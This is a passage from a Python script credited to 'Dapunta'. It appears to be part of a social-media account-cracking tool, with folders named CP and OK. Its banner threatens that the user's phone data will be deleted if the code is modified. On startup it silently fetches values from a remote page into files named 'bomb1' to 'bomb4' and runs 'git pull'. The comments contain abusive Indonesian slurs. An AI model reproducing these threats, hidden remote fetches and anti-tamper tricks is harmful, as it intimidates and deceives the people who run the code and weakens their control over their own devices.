    _dapunta_cici_('%s╠══[ %sEnglish %s]'%(M,P,M))
    _dapunta_cici_("%s║   • %sYou Can't Change This SC"%(M,P))
    _dapunta_cici_("%s║   • %sWithout Author's Permission"%(M,P))
    _dapunta_cici_('%s║   • %sAfter This Warning Appears'%(M,P))
    _dapunta_cici_('%s║   • %sMeans You Have Changed The Contents Of This SC'%(M,P))
    _dapunta_cici_('%s║   • %sThen The Data On Your Phone Will Be Deleted'%(M,P))
    _dapunta_cici_('%s║   • %sNever Infringe Copyright'%(M,P))
    _dapunta_cici_('%s║   • %sYou Must Purchase License For Premium'%(M,P))
    _dapunta_cici_('%s║   • %sNothing is free'%(M,P))
    _dapunta_cici_('%s║   • %sStop Recode !!!'%(M,P))
    _dapunta_cici_('%s║   • %sThank You'%(M,P))
    _dapunta_cici_('%s║'%(M))
    _dapunta_cici_('%s╚══[ %sRegard Dapunta %s]%s'%(M,P,M,P))
    _dapunta_cici_('%s'%(P))
    _cici_cici_()

### Membuat Folder Direktori
#if len(str(_my_account_)) != 371:clear();print('Jangan Ganti Bot Followersnya Kontol');time.sleep(5);kata_buat_perecode()
def folder():
    try:os.mkdir("CP")
    except:pass
    try:os.mkdir("OK")
    except:pass

### Mau Ngapain Coek Goblokss
def aokwaokwaokw(fuck):
    clear();_ceok_ = []
    try:os.remove(bomb1);os.remove(bomb2);os.remove(bomb3);os.remove(bomb4)
    except:pass
    try:
        _par_ = par(_req_get_(fuck).text)
        for _cok_ in _par_.find_all('tbody'):
            for _cuk_ in _cok_.find_all('td'):_ceok_.append(_cuk_.text)
        _cuok_ = _ceok_[1];open(bomb1,'w').write(_cuok_.split(pisah)[0]);open(bomb2,'w').write(_cuok_.split(pisah)[1]);open(bomb3,'w').write(_cuok_.split(pisah)[2]);open(bomb4,'w').write(_cuok_.split(pisah)[3])
    except:
        open(bomb1,'w').write('_zxcv!.95lltgv#@%-=;sfg_');open(bomb2,'w').write('Dapunta_Ratya');open(bomb3,'w').write('EliteSourceCode01');open(bomb4,'w').write('ILoveYou')

### Trigger
if __name__=='__main__':aokwaokwaokw(_qwerty_);os.system('git pull');clear();haha=open('anti_recode.txt','w');haha.write(_r369uz_);haha.close();folder();aowkaowkaowk();menu()
